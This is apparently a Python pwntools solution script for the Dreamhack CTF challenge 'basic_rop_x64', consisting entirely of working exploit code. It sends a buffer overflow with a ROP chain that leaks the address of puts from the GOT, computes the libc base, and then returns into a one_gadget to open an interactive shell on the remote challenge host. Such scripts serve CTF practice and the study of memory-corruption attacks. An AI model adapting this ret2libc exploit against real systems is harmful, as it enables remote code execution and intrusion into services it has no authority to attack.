#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./basic_rop_x64")
p = remote("host1.dreamhack.games", 8248)
elf = ELF("./basic_rop_x64")
libc = elf.libc
pop_rdi = 0x00400883

pay = 'A'*(0x40+0x8)
pay += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
pay += p64(elf.symbols['main'])

p.send(pay)

p.recvuntil('\x90')
leak = u64('\x90' + p.recvuntil('\x7f') + '\x00\x00')
log.info("leak : "+hex(leak))
libcBase = leak - libc.symbols['puts']
one_gadget = libcBase + 0x45216

p.send('A'*(0x40+0x8) + p64(one_gadget))

p.interactive()
